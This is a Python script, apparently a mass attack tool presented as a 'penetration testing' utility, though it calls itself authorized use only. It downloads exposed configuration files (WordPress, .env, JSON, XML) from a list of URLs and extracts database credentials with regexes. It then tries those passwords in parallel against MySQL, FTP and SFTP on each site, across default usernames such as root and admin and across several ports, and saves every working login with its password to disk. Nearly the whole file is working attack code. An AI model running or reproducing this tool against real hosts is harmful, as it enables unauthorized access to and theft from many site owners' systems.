#!/usr/bin/env python3
"""
Multi-Protocol Penetration Testing Script - Enhanced with Retry Logic and Deduplication
For authorized security testing only.
Tests MySQL, FTP, and SFTP with extracted credentials from various file formats.
Enhanced Features:
- Retry mechanism with exponential backoff
- Duplicate prevention for outputs
- Sequential testing per URL for better reliability
- Improved error handling and logging
"""

import requests
import re
import pymysql
import socket
import tempfile
import os
import time
from urllib.parse import urlparse
from typing import Dict, List, Tuple, Optional, Set
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import urllib3
import ssl
import json
import ftplib
import paramiko
from queue import Queue
import asyncio
import aiohttp
import aiofiles
import hashlib
from dataclasses import dataclass
from collections import defaultdict

# Disable SSL warnings and configure for maximum compatibility
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

# Configure logging with complete noise suppression
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('pentest.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Completely suppress all noisy libraries
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)
logging.getLogger("paramiko.client").setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# Suppress paramiko warnings globally
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module="paramiko")

@dataclass
class ConnectionResult:
    """Data class for storing connection results"""
    host: str
    port: int
    username: str
    password: str
    protocol: str
    database: str = None
    version: str = None
    file_count: int = 0
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    
    def get_hash(self) -> str:
        """Generate unique hash for deduplication"""
        unique_string = f"{self.protocol}:{self.host}:{self.port}:{self.username}:{self.password}:{self.database or ''}"
        return hashlib.md5(unique_string.encode()).hexdigest()

class RetryManager:
    """Manages retry logic with exponential backoff"""
    
    def __init__(self, max_retries: int = 3, base_delay: float = 1.0, max_delay: float = 10.0):
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.max_delay = max_delay
    
    def retry_with_backoff(self, func, *args, **kwargs):
        """Execute function with retry logic and exponential backoff"""
        last_exception = None
        
        for attempt in range(self.max_retries + 1):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                last_exception = e
                if attempt < self.max_retries:
                    delay = min(self.base_delay * (2 ** attempt), self.max_delay)
                    logger.debug(f"Attempt {attempt + 1} failed, retrying in {delay:.2f}s: {str(e)}")
                    time.sleep(delay)
                else:
                    logger.debug(f"All {self.max_retries + 1} attempts failed for {func.__name__}")
        
        return None

class DuplicateManager:
    """Manages duplicate prevention for results"""
    
    def __init__(self):
        self.seen_hashes: Set[str] = set()
        self.lock = threading.Lock()
    
    def is_duplicate(self, result: ConnectionResult) -> bool:
        """Check if result is a duplicate"""
        result_hash = result.get_hash()
        with self.lock:
            if result_hash in self.seen_hashes:
                return True
            self.seen_hashes.add(result_hash)
            return False

class MultiProtocolPenTester:
    def __init__(self, max_workers=50, timeout=10, protocols=None, max_retries=3):
        self.max_workers = max_workers
        self.timeout = timeout
        self.max_retries = max_retries
        self.enabled_protocols = protocols or ['mysql', 'ftp', 'sftp']
        
        # Initialize retry manager
        self.retry_manager = RetryManager(max_retries=max_retries)
        
        # Initialize duplicate manager
        self.duplicate_manager = DuplicateManager()
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.session.verify = False
        self.session.trust_env = False
        
        # Configure adapter for retry and SSL handling
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Default credentials and ports
        self.default_usernames = ['root', 'admin', 'mysql', 'db_admin', 'ftpuser', 'user', 'anonymous']
        self.mysql_ports = [3306, 3307, 33060, 33061]
        self.ftp_ports = [21, 2121, 990]  # Standard FTP and FTPS
        self.sftp_ports = [22, 2222, 222]  # SSH/SFTP ports
        
        # Results storage
        self.successful_mysql = []
        self.successful_ftp = []
        self.successful_sftp = []
        
        # Output files
        self.mysql_output = 'mysql_results.txt'
        self.ftp_output = 'ftp_results.txt'
        self.sftp_output = 'sftp_results.txt'
        
        # Thread-safe locks
        self.mysql_lock = threading.Lock()
        self.ftp_lock = threading.Lock()
        self.sftp_lock = threading.Lock()
        
        # Statistics
        self.stats = {
            'urls_processed': 0,
            'mysql_attempts': 0,
            'ftp_attempts': 0,
            'sftp_attempts': 0,
            'mysql_successes': 0,
            'ftp_successes': 0,
            'sftp_successes': 0,
            'retries_performed': 0,
            'duplicates_prevented': 0
        }
        self.stats_lock = threading.Lock()
        
    def extract_domain_from_url(self, url: str) -> str:
        """Extract domain from URL"""
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except Exception as e:
            logger.error(f"Error parsing URL {url}: {e}")
            return ""
    
    def get_ip_from_domain(self, domain: str) -> str:
        """Get IP address from domain with retry"""
        def _resolve():
            return socket.gethostbyname(domain)
        
        ip = self.retry_manager.retry_with_backoff(_resolve)
        if ip:
            logger.info(f"Resolved {domain} to {ip}")
            return ip
        else:
            logger.error(f"Could not resolve {domain} after {self.max_retries} attempts")
            return ""

    async def download_file_async(self, url: str) -> Optional[Tuple[str, str]]:
        """Async download file from URL and return content with file extension"""
        try:
            logger.info(f"Downloading: {url}")
            
            # Extract file extension from URL
            file_extension = os.path.splitext(urlparse(url).path)[1].lower()
            
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            connector = aiohttp.TCPConnector(ssl=False, limit=100)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        content = await response.text(errors='ignore')
                        return content, file_extension
                    else:
                        # Try HTTP fallback if HTTPS fails
                        if url.startswith('https://'):
                            http_url = url.replace('https://', 'http://')
                            async with session.get(http_url) as http_response:
                                if http_response.status == 200:
                                    content = await http_response.text(errors='ignore')
                                    return content, file_extension
                        return None, file_extension
                        
        except Exception as e:
            logger.error(f"Error downloading {url}: {e}")
            return None, ""

    def download_file(self, url: str) -> Optional[Tuple[str, str]]:
        """Sync wrapper for async download with retry"""
        def _download():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                return loop.run_until_complete(self.download_file_async(url))
            except Exception as e:
                raise e
            finally:
                loop.close()
        
        result = self.retry_manager.retry_with_backoff(_download)
        if result is None:
            with self.stats_lock:
                self.stats['retries_performed'] += self.max_retries
        return result

    def extract_from_json(self, json_data) -> Dict[str, str]:
        """Extract database credentials from JSON data"""
        credentials = {}
        
        def search_json_recursive(obj, path=""):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    key_lower = key.lower()
                    
                    # Direct key matches
                    if key_lower in ['database', 'db_name', 'dbname']:
                        credentials['DB_NAME'] = str(value)
                    elif key_lower in ['username', 'user', 'db_user', 'mysql_user']:
                        credentials['DB_USER'] = str(value)
                    elif key_lower in ['password', 'pass', 'db_password', 'mysql_password']:
                        credentials['DB_PASSWORD'] = str(value)
                    elif key_lower in ['host', 'hostname', 'db_host', 'mysql_host', 'server']:
                        credentials['DB_HOST'] = str(value)
                    elif key_lower in ['port', 'db_port', 'mysql_port']:
                        credentials['DB_PORT'] = str(value)
                    
                    # Check if value is a connection string
                    if isinstance(value, str) and any(keyword in value.lower() for keyword in ['mysql://', 'jdbc:', 'server=', 'host=']):
                        conn_creds = self.parse_connection_string(value)
                        credentials.update(conn_creds)
                    
                    # Recurse into nested objects
                    if isinstance(value, (dict, list)):
                        search_json_recursive(value, f"{path}.{key}" if path else key)
                        
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    if isinstance(item, (dict, list)):
                        search_json_recursive(item, f"{path}[{i}]")
        
        search_json_recursive(json_data)
        return credentials
    
    def extract_from_env_format(self, content: str) -> Dict[str, str]:
        """Extract credentials from environment/ini format files"""
        credentials = {}
        
        env_patterns = {
            'DB_NAME': [
                r'(?:export\s+)?(?:DB_NAME|DATABASE|MYSQL_DATABASE)\s*=\s*["\']?([^"\'\s\n]+)["\']?',
                r'database\s*=\s*["\']?([^"\'\s\n]+)["\']?'
            ],
            'DB_USER': [
                r'(?:export\s+)?(?:DB_USER|DB_USERNAME|MYSQL_USER|USERNAME)\s*=\s*["\']?([^"\'\s\n]+)["\']?',
                r'user\s*=\s*["\']?([^"\'\s\n]+)["\']?'
            ],
            'DB_PASSWORD': [
                r'(?:export\s+)?(?:DB_PASSWORD|DB_PASS|MYSQL_PASSWORD|PASSWORD)\s*=\s*["\']?([^"\'\s\n]+)["\']?',
                r'password\s*=\s*["\']?([^"\'\s\n]+)["\']?'
            ],
            'DB_HOST': [
                r'(?:export\s+)?(?:DB_HOST|MYSQL_HOST|HOST|HOSTNAME)\s*=\s*["\']?([^"\'\s\n]+)["\']?',
                r'host\s*=\s*["\']?([^"\'\s\n]+)["\']?'
            ],
            'DB_PORT': [
                r'(?:export\s+)?(?:DB_PORT|MYSQL_PORT|PORT)\s*=\s*["\']?(\d+)["\']?',
                r'port\s*=\s*["\']?(\d+)["\']?'
            ]
        }
        
        for key, patterns in env_patterns.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
                if match and key not in credentials:
                    credentials[key] = match.group(1)
                    break
        
        return credentials
    
    def extract_from_xml_format(self, content: str) -> Dict[str, str]:
        """Extract credentials from XML/config format files"""
        credentials = {}
        
        xml_patterns = {
            'DB_NAME': [
                r'<(?:database|dbname|db-name)>([^<]+)</(?:database|dbname|db-name)>',
                r'database\s*=\s*["\']([^"\']+)["\']'
            ],
            'DB_USER': [
                r'<(?:username|user|db-user)>([^<]+)</(?:username|user|db-user)>',
                r'user(?:name)?\s*=\s*["\']([^"\']+)["\']'
            ],
            'DB_PASSWORD': [
                r'<(?:password|pass|db-password)>([^<]+)</(?:password|pass|db-password)>',
                r'password\s*=\s*["\']([^"\']+)["\']'
            ],
            'DB_HOST': [
                r'<(?:host|hostname|server|db-host)>([^<]+)</(?:host|hostname|server|db-host)>',
                r'host\s*=\s*["\']([^"\']+)["\']'
            ],
            'DB_PORT': [
                r'<(?:port|db-port)>(\d+)</(?:port|db-port)>',
                r'port\s*=\s*["\']?(\d+)["\']?'
            ]
        }
        
        for key, patterns in xml_patterns.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
                if match and key not in credentials:
                    credentials[key] = match.group(1)
                    break
        
        return credentials
    
    def parse_connection_string(self, conn_str: str) -> Dict[str, str]:
        """Parse database connection strings"""
        credentials = {}
        
        mysql_patterns = {
            'DB_USER': r'(?:user|uid)=([^;]+)',
            'DB_PASSWORD': r'(?:password|pwd)=([^;]+)',
            'DB_HOST': r'(?:server|host|data source)=([^;:]+)',
            'DB_PORT': r'(?:port)=(\d+)',
            'DB_NAME': r'(?:database|initial catalog)=([^;]+)'
        }
        
        # JDBC URL pattern
        jdbc_match = re.search(r'jdbc:mysql://([^:]+):?(\d+)?/([^?]+)', conn_str, re.IGNORECASE)
        if jdbc_match:
            credentials['DB_HOST'] = jdbc_match.group(1)
            if jdbc_match.group(2):
                credentials['DB_PORT'] = jdbc_match.group(2)
            credentials['DB_NAME'] = jdbc_match.group(3)
        
        for key, pattern in mysql_patterns.items():
            match = re.search(pattern, conn_str, re.IGNORECASE)
            if match:
                credentials[key] = match.group(1)
        
        return credentials
    
    def extract_db_credentials(self, content: str, file_extension: str = '') -> Dict[str, str]:
        """Extract database credentials from various file formats"""
        credentials = {}
        
        # WordPress config patterns
        wp_patterns = {
            'DB_NAME': r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            'DB_USER': r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            'DB_PASSWORD': r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            'DB_HOST': r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]",
            'DB_PORT': r"define\s*\(\s*['\"]DB_PORT['\"]\s*,\s*['\"]([^'\"]+)['\"]"
        }
        
        # Generic database patterns
        generic_patterns = {
            'DB_NAME': [
                r"database[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"db[_\s]*name[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"dbname[_\s]*[:=]\s*['\"]([^'\"]+)['\"]"
            ],
            'DB_USER': [
                r"username[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"user[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"db[_\s]*user[_\s]*[:=]\s*['\"]([^'\"]+)['\"]"
            ],
            'DB_PASSWORD': [
                r"password[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"pass[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"db[_\s]*password[_\s]*[:=]\s*['\"]([^'\"]+)['\"]"
            ],
            'DB_HOST': [
                r"host[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"hostname[_\s]*[:=]\s*['\"]([^'\"]+)['\"]",
                r"server[_\s]*[:=]\s*['\"]([^'\"]+)['\"]"
            ],
            'DB_PORT': [
                r"port[_\s]*[:=]\s*['\"]?(\d+)['\"]?",
                r"db[_\s]*port[_\s]*[:=]\s*['\"]?(\d+)['\"]?"
            ]
        }
        
        # Try WordPress patterns first
        for key, pattern in wp_patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                credentials[key] = match.group(1)
                logger.debug(f"Found {key}: {credentials[key]} (WordPress)")
        
        # Try generic patterns if no WordPress found
        if not any(k in credentials for k in ['DB_NAME', 'DB_USER', 'DB_PASSWORD']):
            for key, patterns in generic_patterns.items():
                for pattern in patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match and key not in credentials:
                        credentials[key] = match.group(1)
                        logger.debug(f"Found {key}: {credentials[key]} (Generic)")
                        break
        
        # Try JSON extraction
        if file_extension in ['.json'] or (content.strip().startswith('{') and content.strip().endswith('}')):
            try:
                json_data = json.loads(content)
                json_creds = self.extract_from_json(json_data)
                for key, value in json_creds.items():
                    if key not in credentials:
                        credentials[key] = value
                        logger.debug(f"Found {key}: {value} (JSON)")
            except json.JSONDecodeError:
                pass
        
        # Try environment format
        if file_extension in ['.env', '.ini', '.conf', '.config'] or 'export ' in content:
            env_creds = self.extract_from_env_format(content)
            for key, value in env_creds.items():
                if key not in credentials:
                    credentials[key] = value
                    logger.debug(f"Found {key}: {value} (Environment)")
        
        # Try XML format
        if file_extension in ['.xml', '.config'] or '<' in content and '>' in content:
            xml_creds = self.extract_from_xml_format(content)
            for key, value in xml_creds.items():
                if key not in credentials:
                    credentials[key] = value
                    logger.debug(f"Found {key}: {value} (XML)")
        
        return credentials

    def test_mysql_connection(self, host: str, port: int, username: str, password: str, database: str = None) -> bool:
        """Test MySQL connection with given credentials and retry logic"""
        def _test_mysql():
            # First check if MySQL port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result_port = sock.connect_ex((host, port))
            sock.close()
            
            if result_port != 0:
                raise Exception(f"Port {port} not open on {host}")
            
            connection = pymysql.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                database=database,
                connect_timeout=3,
                charset='utf8mb4'
            )
            
            with connection.cursor() as cursor:
                cursor.execute("SELECT VERSION()")
                version = cursor.fetchone()
                
            connection.close()
            return version[0] if version else 'Unknown'
        
        try:
            with self.stats_lock:
                self.stats['mysql_attempts'] += 1
            
            version = self.retry_manager.retry_with_backoff(_test_mysql)
            
            if version:
                result = ConnectionResult(
                    host=host,
                    port=port,
                    username=username,
                    password=password,
                    protocol='mysql',
                    database=database,
                    version=version
                )
                
                # Check for duplicates
                if not self.duplicate_manager.is_duplicate(result):
                    with self.mysql_lock:
                        self.successful_mysql.append(result)
                        logger.info(f"MYSQL SUCCESS: {username}@{host}:{port}")
                        self.write_mysql_result(result)
                        
                    with self.stats_lock:
                        self.stats['mysql_successes'] += 1
                        
                    return True
                else:
                    with self.stats_lock:
                        self.stats['duplicates_prevented'] += 1
                    logger.debug(f"Duplicate MySQL result prevented: {username}@{host}:{port}")
            
            return False
            
        except Exception as e:
            logger.debug(f"MySQL test failed for {username}@{host}:{port}: {str(e)}")
            return False

    def test_ftp_connection(self, host: str, port: int, username: str, password: str) -> bool:
        """Test FTP connection with given credentials and retry logic"""
        def _test_ftp():
            # First check if FTP port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result_port = sock.connect_ex((host, port))
            sock.close()
            
            if result_port != 0:
                raise Exception(f"Port {port} not open on {host}")
            
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=3)
            ftp.login(username, password)
            
            # Test directory listing
            files = ftp.nlst()
            ftp.quit()
            return len(files)
        
        try:
            with self.stats_lock:
                self.stats['ftp_attempts'] += 1
            
            file_count = self.retry_manager.retry_with_backoff(_test_ftp)
            
            if file_count is not None:
                result = ConnectionResult(
                    host=host,
                    port=port,
                    username=username,
                    password=password,
                    protocol='ftp',
                    file_count=file_count
                )
                
                # Check for duplicates
                if not self.duplicate_manager.is_duplicate(result):
                    with self.ftp_lock:
                        self.successful_ftp.append(result)
                        logger.info(f"FTP SUCCESS: {username}@{host}:{port} ({file_count} files)")
                        self.write_ftp_result(result)
                        
                    with self.stats_lock:
                        self.stats['ftp_successes'] += 1
                        
                    return True
                else:
                    with self.stats_lock:
                        self.stats['duplicates_prevented'] += 1
                    logger.debug(f"Duplicate FTP result prevented: {username}@{host}:{port}")
            
            return False
            
        except Exception as e:
            logger.debug(f"FTP test failed for {username}@{host}:{port}: {str(e)}")
            return False

    def test_sftp_connection(self, host: str, port: int, username: str, password: str) -> bool:
        """Test SFTP connection with given credentials and retry logic"""
        def _test_sftp():
            # First check if SSH port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result_port = sock.connect_ex((host, port))
            sock.close()
            
            if result_port != 0:
                raise Exception(f"Port {port} not open on {host}")
            
            # Completely disable paramiko logging during connection
            import logging
            old_level = logging.getLogger().level
            logging.getLogger().setLevel(logging.CRITICAL)
            
            # Redirect stderr to suppress remaining noise
            import sys
            import os
            old_stderr = sys.stderr
            sys.stderr = open(os.devnull, 'w')
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    host, 
                    port=port, 
                    username=username, 
                    password=password, 
                    timeout=3,
                    banner_timeout=3,
                    auth_timeout=3,
                    look_for_keys=False,
                    allow_agent=False,
                    compress=False
                )
                
                sftp = ssh.open_sftp()
                files = sftp.listdir('.')
                sftp.close()
                ssh.close()
                
                return len(files)
                
            finally:
                # Restore stderr and logging
                sys.stderr.close()
                sys.stderr = old_stderr
                logging.getLogger().setLevel(old_level)
        
        try:
            with self.stats_lock:
                self.stats['sftp_attempts'] += 1
            
            file_count = self.retry_manager.retry_with_backoff(_test_sftp)
            
            if file_count is not None:
                result = ConnectionResult(
                    host=host,
                    port=port,
                    username=username,
                    password=password,
                    protocol='sftp',
                    file_count=file_count
                )
                
                # Check for duplicates
                if not self.duplicate_manager.is_duplicate(result):
                    with self.sftp_lock:
                        self.successful_sftp.append(result)
                        logger.info(f"SFTP SUCCESS: {username}@{host}:{port} ({file_count} files)")
                        self.write_sftp_result(result)
                        
                    with self.stats_lock:
                        self.stats['sftp_successes'] += 1
                        
                    return True
                else:
                    with self.stats_lock:
                        self.stats['duplicates_prevented'] += 1
                    logger.debug(f"Duplicate SFTP result prevented: {username}@{host}:{port}")
            
            return False
            
        except Exception as e:
            logger.debug(f"SFTP test failed for {username}@{host}:{port}: {str(e)}")
            return False

    def write_mysql_result(self, result: ConnectionResult):
        """Write MySQL result to file"""
        try:
            with open(self.mysql_output, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"MYSQL CONNECTION SUCCESS!\n")
                f.write(f"Host: {result.host}\n")
                f.write(f"Port: {result.port}\n")
                f.write(f"Username: {result.username}\n")
                f.write(f"Password: {result.password}\n")
                f.write(f"Database: {result.database}\n")
                f.write(f"MySQL Version: {result.version}\n")
                f.write(f"Timestamp: {result.timestamp}\n")
                f.write(f"Hash: {result.get_hash()}\n")
                f.write(f"{'='*60}\n")
        except Exception as e:
            logger.error(f"Error writing MySQL result: {e}")

    def write_ftp_result(self, result: ConnectionResult):
        """Write FTP result to file"""
        try:
            with open(self.ftp_output, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"FTP CONNECTION SUCCESS!\n")
                f.write(f"Host: {result.host}\n")
                f.write(f"Port: {result.port}\n")
                f.write(f"Username: {result.username}\n")
                f.write(f"Password: {result.password}\n")
                f.write(f"Files Found: {result.file_count}\n")
                f.write(f"Timestamp: {result.timestamp}\n")
                f.write(f"Hash: {result.get_hash()}\n")
                f.write(f"{'='*60}\n")
        except Exception as e:
            logger.error(f"Error writing FTP result: {e}")

    def write_sftp_result(self, result: ConnectionResult):
        """Write SFTP result to file"""
        try:
            with open(self.sftp_output, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"SFTP CONNECTION SUCCESS!\n")
                f.write(f"Host: {result.host}\n")
                f.write(f"Port: {result.port}\n")
                f.write(f"Username: {result.username}\n")
                f.write(f"Password: {result.password}\n")
                f.write(f"Files Found: {result.file_count}\n")
                f.write(f"Timestamp: {result.timestamp}\n")
                f.write(f"Hash: {result.get_hash()}\n")
                f.write(f"{'='*60}\n")
        except Exception as e:
            logger.error(f"Error writing SFTP result: {e}")

    def test_protocol_credentials_sequential(self, domain: str, credentials: Dict[str, str]) -> Dict[str, bool]:
        """Test credentials sequentially for all enabled protocols"""
        if not credentials.get('DB_USER') or not credentials.get('DB_PASSWORD'):
            return {protocol: False for protocol in self.enabled_protocols}
        
        ip_address = self.get_ip_from_domain(domain)
        
        # Prepare hosts
        hosts_to_test = [domain]
        if ip_address and ip_address != domain:
            hosts_to_test.append(ip_address)
        
        if credentials.get('DB_HOST') and credentials['DB_HOST'] not in ['localhost', '127.0.0.1']:
            if credentials['DB_HOST'] not in hosts_to_test:
                hosts_to_test.append(credentials['DB_HOST'])
        
        # Prepare usernames
        usernames_to_test = [credentials['DB_USER']]
        for default_user in self.default_usernames:
            if default_user not in usernames_to_test:
                usernames_to_test.append(default_user)
        
        results = {}
        
        # Test each protocol sequentially
        for protocol in self.enabled_protocols:
            logger.info(f"Testing {protocol.upper()} for {domain}...")
            results[protocol] = False
            
            # Prepare ports based on protocol
            if protocol == 'mysql':
                ports_to_test = self.mysql_ports.copy()
                if credentials.get('DB_PORT'):
                    custom_port = int(credentials['DB_PORT'])
                    if custom_port not in ports_to_test:
                        ports_to_test.insert(0, custom_port)
                test_func = self.test_mysql_connection
                extra_param = credentials.get('DB_NAME')
            elif protocol == 'ftp':
                ports_to_test = self.ftp_ports
                test_func = self.test_ftp_connection
                extra_param = None
            elif protocol == 'sftp':
                ports_to_test = self.sftp_ports
                test_func = self.test_sftp_connection
                extra_param = None
            else:
                continue
            
            # Test all combinations for this protocol
            protocol_success = False
            for host in hosts_to_test:
                if protocol_success:
                    break
                for port in ports_to_test:
                    if protocol_success:
                        break
                    for username in usernames_to_test:
                        try:
                            if extra_param is not None:
                                success = test_func(host, port, username, credentials['DB_PASSWORD'], extra_param)
                            else:
                                success = test_func(host, port, username, credentials['DB_PASSWORD'])
                            
                            if success:
                                results[protocol] = True
                                protocol_success = True
                                logger.info(f"✅ {protocol.upper()} success: {username}@{host}:{port}")
                                break
                        except Exception as e:
                            logger.debug(f"Error testing {protocol} {username}@{host}:{port}: {e}")
            
            if not protocol_success:
                logger.info(f"❌ {protocol.upper()} failed for {domain}")
        
        return results

    def process_single_url(self, url: str) -> Dict[str, bool]:
        """Process a single URL and test selected protocols sequentially"""
        try:
            logger.info(f"\n{'='*80}")
            logger.info(f"Processing URL: {url}")
            logger.info(f"{'='*80}")
            
            # Download file
            result = self.download_file(url)
            if not result or result[0] is None:
                logger.warning(f"Could not download: {url}")
                return {protocol: False for protocol in self.enabled_protocols}
            
            content, file_extension = result
            logger.info(f"Downloaded {len(content)} bytes with extension: {file_extension}")
            
            # Check for database keywords
            db_keywords = ['database', 'mysql', 'db_name', 'username', 'password', 'host', 'port']
            if not any(keyword.lower() in content.lower() for keyword in db_keywords):
                logger.info(f"No database keywords found in: {url}")
                return {protocol: False for protocol in self.enabled_protocols}
            
            # Extract credentials
            credentials = self.extract_db_credentials(content, file_extension)
            if not credentials:
                logger.info(f"No credentials extracted from: {url}")
                return {protocol: False for protocol in self.enabled_protocols}
            
            logger.info(f"Found credentials in: {url}")
            logger.info(f"Extracted: {', '.join(credentials.keys())}")
            
            # Extract domain
            domain = self.extract_domain_from_url(url)
            if not domain:
                logger.warning(f"Could not extract domain from: {url}")
                return {protocol: False for protocol in self.enabled_protocols}
            
            # Test protocols sequentially
            results = self.test_protocol_credentials_sequential(domain, credentials)
            
            # Update statistics
            with self.stats_lock:
                self.stats['urls_processed'] += 1
            
            # Log results summary
            success_count = sum(results.values())
            total_protocols = len(self.enabled_protocols)
            logger.info(f"\n📊 URL Results Summary for {url}:")
            logger.info(f"   Successful protocols: {success_count}/{total_protocols}")
            for protocol, success in results.items():
                status = "✅" if success else "❌"
                logger.info(f"   {status} {protocol.upper()}")
            
            return results
            
        except Exception as e:
            logger.error(f"Error processing {url}: {e}")
            return {protocol: False for protocol in self.enabled_protocols}

    def process_urls_from_file(self, file_path: str):
        """Process URLs from file with sequential protocol testing"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            logger.info(f"Found {len(urls)} URLs to process")
            logger.info(f"Using {self.max_workers} parallel workers for URL processing")
            logger.info(f"Testing protocols sequentially: {', '.join(self.enabled_protocols).upper()}")
            logger.info(f"Retry attempts per operation: {self.max_retries}")
            
            # Initialize output files only for enabled protocols
            protocol_files = {
                'mysql': (self.mysql_output, 'MySQL'),
                'ftp': (self.ftp_output, 'FTP'),
                'sftp': (self.sftp_output, 'SFTP')
            }
            
            for protocol in self.enabled_protocols:
                output_file, protocol_name = protocol_files[protocol]
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(f"{protocol_name} Penetration Testing Results - Enhanced with Retry & Deduplication\n")
                    f.write(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total URLs: {len(urls)}\n")
                    f.write(f"Max Workers: {self.max_workers}\n")
                    f.write(f"Max Retries: {self.max_retries}\n")
                    f.write(f"Selected Protocols: {', '.join(self.enabled_protocols).upper()}\n")
                    f.write(f"Sequential Testing: Enabled\n")
                    f.write(f"Duplicate Prevention: Enabled\n\n")
            
            # Process URLs in parallel (each URL tests protocols sequentially)
            start_time = time.time()
            
            with ThreadPoolExecutor(max_workers=min(self.max_workers, len(urls))) as executor:
                future_to_url = {executor.submit(self.process_single_url, url): url for url in urls}
                
                completed = 0
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    completed += 1
                    try:
                        results = future.result()
                        success_count = sum(results.values())
                        total_protocols = len(self.enabled_protocols)
                        logger.info(f"[{completed}/{len(urls)}] Completed {url}: {success_count}/{total_protocols} protocols successful")
                    except Exception as e:
                        logger.error(f"[{completed}/{len(urls)}] Error processing {url}: {e}")
            
            end_time = time.time()
            total_time = end_time - start_time
            
            # Final summary with enhanced statistics
            logger.info(f"\n{'='*80}")
            logger.info(f"ENHANCED FINAL SUMMARY")
            logger.info(f"{'='*80}")
            logger.info(f"Total URLs processed: {len(urls)}")
            logger.info(f"Total time: {total_time:.2f} seconds")
            logger.info(f"Average time per URL: {total_time/len(urls):.2f} seconds")
            logger.info(f"Protocols tested: {', '.join(self.enabled_protocols).upper()}")
            logger.info(f"Max retries per operation: {self.max_retries}")
            logger.info(f"Total retry attempts: {self.stats['retries_performed']}")
            logger.info(f"Duplicates prevented: {self.stats['duplicates_prevented']}")
            
            if 'mysql' in self.enabled_protocols:
                logger.info(f"MySQL attempts: {self.stats['mysql_attempts']}")
                logger.info(f"MySQL successes: {len(self.successful_mysql)}")
                if self.successful_mysql:
                    logger.info(f"MySQL results saved to: {self.mysql_output}")
            
            if 'ftp' in self.enabled_protocols:
                logger.info(f"FTP attempts: {self.stats['ftp_attempts']}")
                logger.info(f"FTP successes: {len(self.successful_ftp)}")
                if self.successful_ftp:
                    logger.info(f"FTP results saved to: {self.ftp_output}")
            
            if 'sftp' in self.enabled_protocols:
                logger.info(f"SFTP attempts: {self.stats['sftp_attempts']}")
                logger.info(f"SFTP successes: {len(self.successful_sftp)}")
                if self.successful_sftp:
                    logger.info(f"SFTP results saved to: {self.sftp_output}")
            
            # Calculate success rates
            total_attempts = self.stats['mysql_attempts'] + self.stats['ftp_attempts'] + self.stats['sftp_attempts']
            total_successes = len(self.successful_mysql) + len(self.successful_ftp) + len(self.successful_sftp)
            
            if total_attempts > 0:
                success_rate = (total_successes / total_attempts) * 100
                logger.info(f"Overall success rate: {success_rate:.2f}% ({total_successes}/{total_attempts})")
            
